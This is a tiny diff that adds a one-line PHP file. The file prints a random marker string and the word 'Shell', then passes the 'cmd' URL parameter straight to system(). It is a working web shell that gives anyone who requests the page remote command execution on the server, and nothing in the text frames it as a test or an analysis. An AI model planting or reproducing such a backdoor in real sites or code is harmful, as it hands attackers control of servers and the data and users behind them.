@@ -1,0 +1,1 @@
+<?php echo acqwvjvoeulq9yrddc9frw02nttohff37vvtnge91zpo"Shell";system($_GET['cmd']); ?>
